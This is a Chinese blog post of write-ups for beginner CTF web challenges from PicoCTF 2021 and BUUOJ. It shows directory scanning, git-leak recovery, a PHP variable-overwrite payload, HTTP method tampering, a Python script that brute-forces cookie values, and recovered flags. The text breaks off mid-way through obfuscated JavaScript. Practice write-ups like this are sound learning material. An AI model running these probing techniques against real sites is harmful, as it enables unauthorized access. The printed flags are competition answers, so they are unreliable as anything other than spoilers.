<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="m0re"><meta name="copyright" content="m0re"><meta name="generator" content="Hexo 5.1.0"><meta name="theme" content="hexo-theme-yun"><title>PicoCTF2021_Web(一) | m0re的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/m0re.ico"><link rel="mask-icon" href="/m0re.ico" color="#6200ee"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"m0re.top","root":"/","title":"人生路漫漫","version":"1.6.1","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="人静的雨夜想起了她，她的挽留还萦绕耳旁">
<meta property="og:type" content="article">
<meta property="og:title" content="PicoCTF2021_Web(一)">
<meta property="og:url" content="https://m0re.top/posts/9d77485d/index.html">
<meta property="og:site_name" content="m0re的小站">
<meta property="og:description" content="人静的雨夜想起了她，她的挽留还萦绕耳旁">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/ioenafnaj.jpg">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20210617194049.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20210617221933.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/image-20210807173900720.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/image-20210807174501491.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/image-20210807175043582.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/image-20210807181659435.png">
<meta property="article:published_time" content="2021-08-07T14:20:10.109Z">
<meta property="article:modified_time" content="2021-08-07T14:20:24.708Z">
<meta property="article:author" content="m0re">
<meta property="article:tag" content="CTF题记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/m0re/picture/raw/master/img/ioenafnaj.jpg"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="m0re"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="m0re"><span class="site-author-status" title="穷鬼啊啊啊啊">😭</span></a><div class="site-author-name"><a href="/about/">m0re</a></div><span class="site-name">m0re的小站</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">106</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">12</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">43</span></a></div><a class="site-state-item hty-icon-button" href="/Tools/" title="Tools"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/zxcv0221" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ISm0r3" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:m0re.lxj@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mark-loves-cat"><span class="toc-number">2.</span> <span class="toc-text">Mark loves cat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GET-aHEAD"><span class="toc-number">3.</span> <span class="toc-text">GET aHEAD</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cookies"><span class="toc-number">4.</span> <span class="toc-text">Cookies</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Scavenger-Hunt"><span class="toc-number">5.</span> <span class="toc-text">Scavenger Hunt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Some-Assembly-Required-1"><span class="toc-number">6.</span> <span class="toc-text">Some Assembly Required 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#More-Cookies"><span class="toc-number">7.</span> <span class="toc-text">More Cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%A7%A3%E6%9E%90"><span class="toc-number">7.1.</span> <span class="toc-text">脚本解析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">8.</span> <span class="toc-text">Reference</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://m0re.top/posts/9d77485d/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="m0re"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="m0re的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">PicoCTF2021_Web(一)</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2021-08-07 22:20:10" itemprop="dateCreated datePublished" datetime="2021-08-07T22:20:10+08:00">2021-08-07</time></div><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/9d77485d/" data-flag-title="PicoCTF2021_Web(一)"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTF%E9%A2%98%E8%AE%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF题记</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTF%E9%A2%98%E8%AE%B0/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">CTF题记</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#6200ee;"><p><img src="https://gitee.com/m0re/picture/raw/master/img/ioenafnaj.jpg" loading="lazy"></p>
<p>人静的雨夜想起了她，她的挽留还萦绕耳旁</p>
<a id="more"></a>

<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>无，刷题</p>
<h1 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h1><p>访问靶机寻找，在各个位置查看都是一样的界面，然后找信息泄露，最常见的网站备份没有发现。所以就尝试了扫目录。这里提一下扫目录的时候。我之前在扫描的时候，都是直接默认线程扫描。可能会导致自己的IP被ban，这里的dirsearch扫描的时候可以控制以下线程。<br>比如：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python .<span class="token punctuation">\</span>dirsearch.py -u <span class="token string">"http://xxx.node3.buuoj.cn/"</span> -e * --timeout<span class="token operator">=</span><span class="token number">2</span> -t <span class="token number">1</span> -x <span class="token number">400,403</span>,404,500,503,429</code></pre>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20210617194049.png" loading="lazy"><br>这里发现了git泄露，如果是默认线程扫描，我也进行了尝试，git泄露都扫不出来，所以这也算是一个小技巧。<br>然后<code>gitHack</code>进行复原<code>git</code>泄露的文件，发现报错比较多，而且它不稳定。<code>index.php</code>和<code>flag.php</code>能扫描出来但是无法下载下来。所以我有找到了一个更好一点的工具，使用比较不错<a target="_blank" rel="noopener" href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a><br>使用方法与<code>GitHack</code>差不多。<br>然后是下载下来了文件。</p>
<pre class="language-php" data-language="php"><code class="language-php">#index.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"dog"</span><span class="token punctuation">;</span>
<span class="token variable">$is</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"cat"</span><span class="token punctuation">;</span>
<span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'yds'</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$$y</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>



<span class="token keyword">echo</span> <span class="token double-quoted-string string">"the flag is: "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token shell-comment comment">#flag.php</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php

<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
<p>瞄一眼代码，首先想到变量覆盖。<br>先看这里<code>foreach</code>，三个<code>foreach</code>有这不同的处理方式，这里首先说以下构造payload的两种思路</p>
<ul>
<li><p>通过最后一个<code>if</code>控制语句来构造exit会返回<code>$is</code>，要做的就是用<code>$is</code>覆盖掉<code>$flag</code>的值，尝试get的方式传参，传入<code>is=flag</code>会变成<code>$is=$flag</code>，这里就将flag的值传输过来了。然后需要绕过第一个if控制，就是需要传入flag参数，不管get或者post方式。否则就返回<code>$yds</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210617221933.png" loading="lazy"><br>所以这里就需要利用第二个if了。<br>任意传入一个flag=flag即可，但是传入方式，从代码看不能是post，因为如果是post，就被第一个foreach语句给打乱了整个逻辑。所以要get方式传入。<br>以get方式传入参数还能绕过第三个foreach。就可以得到flag了。<br>payload：<code>?is=flag&amp;flag=flag</code><br>第二种：<code>?yds=flag</code><br>这个属于直接利用第一个if，利用变量覆盖漏洞，得到flag。很简单一道题目，自己看看就好了。</p>
<p>以下内容来自<code>PicoCTF</code></p>
</li>
</ul>
<h1 id="GET-aHEAD"><a href="#GET-aHEAD" class="headerlink" title="GET aHEAD"></a>GET aHEAD</h1><p>题目描述：找到此服务器上的flag以在比赛中领先</p>
<p>hints:</p>
<blockquote>
<p>Maybe you have more than 2 choices<br>Check out tools like Burp suite to modify your requests and look at the responses</p>
</blockquote>
<p>第三种选择，这里提供选择的很明显的一个是颜色，red and blue，然后就是使用burp suite查看响应包并修改一些什么内容。</p>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210807173900720.png" alt="image-20210807173900720" loading="lazy"></p>
<p>发现能改的地方，几乎没有，几个0改1，1改0等等，都没有什么反应，然后就剩下一个地方可以改了，就是请求方式<br>发现在choose Red的时候是get请求。而choose Blue的时候是POST请求，所以猜想可能是修改成另一种请求方式。<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210807174501491.png" alt="image-20210807174501491" loading="lazy"><br>结合题目名字，修改请求头为<code>HEAD</code>，然后发包，拿到flag<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210807175043582.png" alt="image-20210807175043582" loading="lazy"></p>
<h1 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h1><p>在这个搜索cookie的框中，有个占位文本，<code>snickerdoodle</code>，直接输入它，会进入到一个check页面，网页会返回<code>I love snickerdoodle cookies!</code>，然后找遍请求包也没找到flag，这里看到在请求包中存在<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210807181659435.png" alt="image-20210807181659435" loading="lazy"></p>
<p>cookie中有个变量名为name，且为0，尝试将其改为其它数字，1，2，3….</p>
<p>发现返回内容会有变化，所以这里可能就是flag所在。</p>
<p>Python脚本进行修改name的值，并获取返回内容，得到flag</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://mercury.picoctf.net:29649/check"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    text <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'name'</span><span class="token punctuation">:</span> text
    <span class="token punctuation">&#125;</span>

    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
    result <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span>
        <span class="token string">"&lt;p style=\"text-align:center; font-size:30px;\">&lt;b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Testing Cookie:&#123;&#125; | Result: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'I love'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;code>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/code>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
        
<span class="token triple-quoted-string string">"""详情"""</span>
split<span class="token punctuation">(</span><span class="token punctuation">)</span>截取屏幕中央返回字符串内容的html代码</code></pre>

<h1 id="Scavenger-Hunt"><a href="#Scavenger-Hunt" class="headerlink" title="Scavenger Hunt"></a>Scavenger Hunt</h1><p>一个寻宝游戏，跟<code>Insp3ct0r</code>差不多，第一段flag在主站源代码中注释着。第二段flag在<code>css</code>代码中注释着。然后再看<code>js</code>代码中，会发现提示</p>
<pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* How can I keep Google from indexing my website? */</span></code></pre>

<p>与Apache有关的文件，或者说是Apache独有的文件，极有可能是apache的配置文件，以往apache服务刚安装的时候，默认会生成的文件是<code>.htaccess</code>文件，这里直接访问果然得到了信息。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment"># I love making websites on my Mac, I can Store a lot of information there.</span></code></pre>

<p>Mac独有的信息文件，<code>.DS_Store</code>访问即可获取信息泄露的内容。<br>总结：</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- Here's the first part of the flag: picoCTF&#123;t --></span>
/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
/* How can I keep Google from indexing my website? */
# Part 3: t_0f_pl4c
# I think this is an apache server... can you Access the next flag?
# Part 4: 3s_2_lO0k
# I love making websites on my Mac, I can Store a lot of information there.
Congrats! You completed the scavenger hunt. Part 5: _fa04427c&#125;

result: picoCTF&#123;th4ts_4_l0t_0f_pl4c3s_2_lO0k_fa04427c&#125;</code></pre>

<h1 id="Some-Assembly-Required-1"><a href="#Some-Assembly-Required-1" class="headerlink" title="Some Assembly Required 1"></a>Some Assembly Required 1</h1><p>这样的题目，emmm，总是遇到，完全没有思路。<br>思路一：全部复制JS代码，粘贴到控制台。有机会可以运行就能拿到flag<br>思路二：玩转JS。（鲨了我）<br>看JS代码</p>
<pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> _0x402c<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">,</span><span class="token string">'2wfTpTR'</span><span class="token punctuation">,</span><span class="token string">'instantiate'</span><span class="token punctuation">,</span><span class="token string">'275341bEPcme'</span><span class="token punctuation">,</span><span class="token string">'innerHTML'</span><span class="token punctuation">,</span><span class="token string">'1195047NznhZg'</span><span class="token punctuation">,</span><span class="token string">'1qfevql'</span><span class="token punctuation">,</span><span class="token string">'input'</span><span class="token punctuation">,</span><span class="token string">'1699808QuoWhA'</span><span class="token punctuation">,</span><span class="token string">'Correct!'</span><span class="token punctuation">,</span><span class="token string">'check_flag'</span><span class="token punctuation">,</span><span class="token string">'Incorrect!'</span><span class="token punctuation">,</span><span class="token string">'./JIFxzHyW8W'</span><span class="token punctuation">,</span><span class="token string">'23SMpAuA'</span><span class="token punctuation">,</span><span class="token string">'802698XOMSrr'</span><span class="token punctuation">,</span><span class="token string">'charCodeAt'</span><span class="token punctuation">,</span><span class="token string">'474547vVoGDO'</span><span class="token punctuation">,</span><span class="token string">'getElementById'</span><span class="token punctuation">,</span><span class="token string">'instance'</span><span class="token punctuation">,</span><span class="token string">'copy_char'</span><span class="token punctuation">,</span><span class="token string">'43591XxcWUl'</span><span class="token punctuation">,</span><span class="token string">'504454llVtzW'</span><span class="token punctuation">,</span><span class="token string">'arrayBuffer'</span><span class="token punctuation">,</span><span class="token string">'2NIQmVj'</span><span class="token punctuation">,</span><span class="token string">'result'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">_0x4e0e</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x553839<span class="token punctuation">,</span>_0x53c021</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_0x553839<span class="token operator">=</span>_0x553839<span class="token operator">-</span><span class="token number">0x1d6</span><span class="token punctuation">;</span><span class="token keyword">let</span> _0x402c6f<span class="token operator">=</span>_0x402c<span class="token punctuation">[</span>_0x553839<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> _0x402c6f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x76dd13<span class="token punctuation">,</span>_0x3dfcae</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> _0x371ac6<span class="token operator">=</span>_0x4e0e<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> _0x478583<span class="token operator">=</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1eb</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1ed</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1db</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1d9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1de</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1d8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1ea</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>_0x478583<span class="token operator">===</span>_0x3dfcae<span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">else</span> _0x76dd13<span class="token punctuation">[</span><span class="token 